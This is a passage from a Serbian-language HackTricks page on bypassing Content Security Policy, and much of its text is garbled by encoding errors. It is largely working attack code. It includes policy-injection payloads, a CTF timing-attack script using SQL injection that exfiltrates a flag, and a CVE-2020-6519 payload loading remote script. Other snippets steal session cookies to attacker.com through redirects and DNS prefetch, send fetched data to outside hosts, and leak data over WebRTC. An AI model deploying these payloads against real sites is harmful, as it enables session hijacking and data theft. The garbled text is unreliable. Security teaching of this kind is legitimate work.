MoÅ¾ete takoÄ‘e zloupotrebiti ovu konfiguraciju da **uÄitate javascript kod umetnut unutar slike**. Ako, na primer, stranica dozvoljava uÄitavanje slika sa Twitter-a. MoÅ¾ete **napraviti** **posebnu sliku**, **otpremiti** je na Twitter i zloupotrebiti "**unsafe-inline**" da **izvrÅ¡ite** JS kod (kao regularni XSS) koji Ä‡e **uÄitati** **sliku**, **izvuÄ‡i** **JS** iz nje i **izvrÅ¡iti** **ga**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Sa Servisnim Radnicima

Funkcija servisnih radnika **`importScripts`** nije ograniÄena CSP-om:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Injekcija Politike

**IstraÅ¾ivanje:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Ako je **parametar** koji ste poslali **nalepio** unutar **deklaracije** **politike,** onda moÅ¾ete **izmeniti** **politiku** na neki naÄin koji je Äini **beskorisnom**. MoÅ¾ete **dozvoliti skriptu 'unsafe-inline'** sa bilo kojim od ovih zaobilaÅ¾enja:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Zato Å¡to Ä‡e ova direktiva **prepisati postojeÄ‡e script-src direktive**.\
MoÅ¾ete pronaÄ‡i primer ovde: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

U Edge-u je mnogo jednostavnije. Ako moÅ¾ete dodati u CSP samo ovo: **`;_`** **Edge** bi **odbacio** celu **politiku**.\
Primer: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; putem XSS (iframe) - Vremenski napad

Primetite nedostatak direktive `'unsafe-inline'`\
Ovog puta moÅ¾ete naterati Å¾rtvu da **uÄita** stranicu pod **vaÅ¡om kontrolom** putem **XSS** sa `<iframe`. Ovog puta Ä‡ete naterati Å¾rtvu da pristupi stranici sa koje Å¾elite da izvuÄete informacije (**CSRF**). Ne moÅ¾ete pristupiti sadrÅ¾aju stranice, ali ako nekako moÅ¾ete **kontrolisati vreme koje je stranici potrebno da se uÄita** moÅ¾ete izvuÄ‡i informacije koje su vam potrebne.

Ovog puta Ä‡e se **zastavica** izvuÄ‡i, kada god se **karakter ispravno pogodi** putem SQLi, **odgovor** traje **duÅ¾e** zbog sleep funkcije. Tada Ä‡ete moÄ‡i da izvuÄete zastavicu:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Ovaj napad bi podrazumevao neku vrstu socijalnog inÅ¾enjeringa gde napadaÄ **uverava korisnika da prevuÄe i ispusti link preko bookmarkleta u pretraÅ¾ivaÄu**. Ovaj bookmarklet bi sadrÅ¾ao **malicious javascript** kod koji bi, kada se prevuÄe ili klikne, bio izvrÅ¡en u kontekstu trenutnog web prozora, **zaobilazeÄ‡i CSP i omoguÄ‡avajuÄ‡i kraÄ‘u osetljivih informacija** kao Å¡to su kolaÄiÄ‡i ili tokeni.

Za viÅ¡e informacija [**proverite originalni izveÅ¡taj ovde**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

U [**ovoj CTF analizi**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP se zaobilazi injektovanjem unutar dozvoljenog iframe-a stroÅ¾ijeg CSP-a koji je zabranio uÄitavanje specifiÄne JS datoteke koja je, zatim, putem **prototype pollution** ili **dom clobbering** omoguÄ‡ila **zloupotrebu razliÄitog skripta za uÄitavanje proizvoljnog skripta**.

MoÅ¾ete **ograniÄiti CSP iframe-a** sa **`csp`** atributom:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

U [**ovoj CTF analizi**](https://github.com/aszx87410/ctf-writeups/issues/48), bilo je moguÄ‡e putem **HTML injekcije** da se **ograniÄi** viÅ¡e **CSP** tako da je skripta koja spreÄava CSTI onemoguÄ‡ena i stoga je **ranjivost postala iskoristiva.**\
CSP se moÅ¾e uÄiniti restriktivnijim koriÅ¡Ä‡enjem **HTML meta tagova** i inline skripte se mogu onemoguÄ‡iti **uklanjanjem** **unosa** koji omoguÄ‡ava njihov **nonce** i **omoguÄ‡avanjem specifiÄne inline skripte putem sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS exfiltracija sa Content-Security-Policy-Report-Only

Ako uspete da naterate server da odgovori sa zaglavljem **`Content-Security-Policy-Report-Only`** sa **vrednoÅ¡Ä‡u koju kontroliÅ¡ete** (moÅ¾da zbog CRLF), mogli biste da ga usmerite na vaÅ¡ server i ako **obavijete** **JS sadrÅ¾aj** koji Å¾elite da eksfiltrirate sa **`<script>`** i zato Å¡to je veoma verovatno da `unsafe-inline` nije dozvoljen od strane CSP, ovo Ä‡e **pokrenuti CSP greÅ¡ku** i deo skripte (koji sadrÅ¾i osetljive informacije) biÄ‡e poslat serveru iz `Content-Security-Policy-Report-Only`.

Za primer [**proverite ovaj CTF izveÅ¡taj**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Leaking Information with CSP and Iframe

* An `iframe` is created that points to a URL (let's call it `https://example.redirect.com`) which is permitted by CSP.
* This URL then redirects to a secret URL (e.g., `https://usersecret.example2.com`) that is **not allowed** by CSP.
* By listening to the `securitypolicyviolation` event, one can capture the `blockedURI` property. This property reveals the domain of the blocked URI, leaking the secret domain to which the initial URL redirected.

Zanimljivo je napomenuti da pretraÅ¾ivaÄi poput Chrome-a i Firefox-a imaju razliÄita ponaÅ¡anja u rukovanju iframe-ovima u vezi sa CSP-om, Å¡to moÅ¾e dovesti do potencijalnog curenja osetljivih informacija zbog neodreÄ‘enog ponaÅ¡anja.

Druga tehnika ukljuÄuje iskoriÅ¡Ä‡avanje samog CSP-a za dedukciju tajnog poddomena. Ova metoda se oslanja na algoritam binarne pretrage i prilagoÄ‘avanje CSP-a kako bi ukljuÄila specifiÄne domene koje su namerno blokirane. Na primer, ako je tajni poddomen sastavljen od nepoznatih karaktera, moÅ¾ete iterativno testirati razliÄite poddomene modifikovanjem CSP direktive da blokira ili dozvoli ove poddomene. Evo isjeÄka koji prikazuje kako bi CSP mogao biti postavljen da olakÅ¡a ovu metodu:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
PrateÄ‡i koje zahteve CSP blokira ili dozvoljava, moÅ¾e se suziti moguÄ‡i skup karaktera u tajnom poddomeni, na kraju otkrivajuÄ‡i punu URL adresu.

Obe metode koriste nijanse implementacije i ponaÅ¡anja CSP-a u pregledaÄima, pokazujuÄ‡i kako naizgled sigurni propisi mogu nenamerno otkriti osetljive informacije.

Trik iz [**ovde**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji se bavi uzbuÄ‘enjem i izazovima hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Nesigurne tehnologije za zaobilaÅ¾enje CSP-a

### PHP greÅ¡ke kada je previÅ¡e parametara

Prema [**poslednjoj tehnici komentarisanoj u ovom videu**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), slanje previÅ¡e parametara (1001 GET parametar iako to moÅ¾ete uraditi i sa POST parametrima i viÅ¡e od 20 fajlova). Svaki definisani **`header()`** u PHP web kodu **neÄ‡e biti poslat** zbog greÅ¡ke koju Ä‡e ovo izazvati.

### PreoptereÄ‡enje PHP odgovora

PHP je poznat po tome Å¡to **bafuje odgovor do 4096** bajtova po defaultu. Stoga, ako PHP prikazuje upozorenje, pruÅ¾anjem **dovoljno podataka unutar upozorenja**, **odgovor** Ä‡e biti **poslat** **pre** **CSP header-a**, uzrokujuÄ‡i da se header ignoriÅ¡e.\
Tada, tehnika se u suÅ¡tini sastoji u **punjenju bafera odgovora upozorenjima** tako da CSP header ne bude poslat.

Ideja iz [**ovog izveÅ¡taja**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Prepisivanje stranice greÅ¡ke

Iz [**ovog izveÅ¡taja**](https://blog.ssrf.kr/69) izgleda da je bilo moguÄ‡e zaobiÄ‡i CSP zaÅ¡titu uÄitavanjem stranice greÅ¡ke (potencijalno bez CSP-a) i prepisivanjem njenog sadrÅ¾aja.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME je tehnika koja zloupotrebljava XSS (ili veoma ograniÄen XSS) **u krajnjoj taÄki stranice** da **zloupotrebi** **druge krajnje taÄke iste domene.** To se postiÅ¾e uÄitavanjem ranjive krajnje taÄke sa napadaÄke stranice, a zatim osveÅ¾avanjem napadaÄke stranice na pravu krajnju taÄku u istoj domeni koju Å¾elite da zloupotrebite. Na ovaj naÄin **ranjiva krajnja taÄka** moÅ¾e koristiti **`opener`** objekat u **payload-u** da **pristupi DOM-u** **prave krajnje taÄke za zloupotrebu**. Za viÅ¡e informacija pogledajte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Pored toga, **wordpress** ima **JSONP** krajnju taÄku u `/wp-json/wp/v2/users/1?_jsonp=data` koja Ä‡e **odraziti** **podatke** poslati u izlazu (sa ograniÄenjem samo na slova, brojeve i taÄke).

NapadaÄ moÅ¾e zloupotrebiti tu krajnju taÄku da **generiÅ¡e SOME napad** protiv WordPress-a i **ugradi** ga unutar `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` napominjemo da Ä‡e ovaj **script** biti **uÄitan** jer je **dozvoljen od 'self'**. Pored toga, i zato Å¡to je WordPress instaliran, napadaÄ moÅ¾e zloupotrebiti **SOME napad** kroz **ranjivu** **callback** krajnju taÄku koja **zaobilazi CSP** da bi dala viÅ¡e privilegija korisniku, instalirao novi dodatak...\
Za viÅ¡e informacija o tome kako izvesti ovaj napad pogledajte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Ako postoji strogi CSP koji vam ne dozvoljava da **interagujete sa spoljnim serverima**, postoji nekoliko stvari koje uvek moÅ¾ete uraditi da izvuÄete informacije.

### Location

MoÅ¾ete jednostavno aÅ¾urirati lokaciju da poÅ¡aljete tajne informacije na napadaÄev server:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

MoÅ¾ete preusmeriti injektovanjem meta taga (ovo je samo preusmeravanje, ovo neÄ‡e procuriti sadrÅ¾aj)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Da bi uÄitali stranice brÅ¾e, pregledaÄi Ä‡e unapred reÅ¡avati imena hostova u IP adrese i keÅ¡irati ih za kasniju upotrebu.\
MoÅ¾ete naterati pregledaÄ da unapred reÅ¡i ime hosta sa: `<link rel="dns-prefetch" href="something.com">`

MoÅ¾ete zloupotrebiti ovo ponaÅ¡anje da **izvrÅ¡ite eksfiltraciju osetljivih informacija putem DNS zahteva**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
JoÅ¡ jedan naÄin:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Da bi se izbeglo da se ovo desi, server moÅ¾e poslati HTTP zaglavlje:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
ĞÑ‡Ğ¸Ğ³Ğ»ĞµĞ´Ğ½Ğ¾, Ğ¾Ğ²Ğ° Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ° Ğ½Ğµ Ñ€Ğ°Ğ´Ğ¸ Ñƒ Ğ±ĞµĞ·Ğ³Ğ»Ğ°Ğ²Ğ¸Ğ¼ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸Ğ¼Ğ° (Ğ±Ğ¾Ñ‚Ğ¾Ğ²Ğ¸Ğ¼Ğ°)
{% endhint %}

### WebRTC

ĞĞ° Ğ½ĞµĞºĞ¾Ğ»Ğ¸ĞºĞ¾ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ¿Ñ€Ğ¾Ñ‡Ğ¸Ñ‚Ğ°Ñ‚Ğ¸ Ğ´Ğ° **WebRTC Ğ½Ğµ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ°Ğ²Ğ° `connect-src` Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºÑƒ** CSP-Ğ°.

Ğ£ ÑÑ‚Ğ²Ğ°Ñ€Ğ¸, Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ _leak_ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğµ ĞºĞ¾Ñ€Ğ¸ÑÑ‚ĞµÑ›Ğ¸ _DNS Ğ·Ğ°Ñ…Ñ‚ĞµĞ²_. ĞŸĞ¾Ğ³Ğ»ĞµĞ´Ğ°Ñ˜Ñ‚Ğµ Ğ¾Ğ²Ğ°Ñ˜ ĞºĞ¾Ğ´:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
JoÅ¡ jedna opcija:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Proveravanje CSP politika online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatsko kreiranje CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Reference

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija obaveÅ¡tenja**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
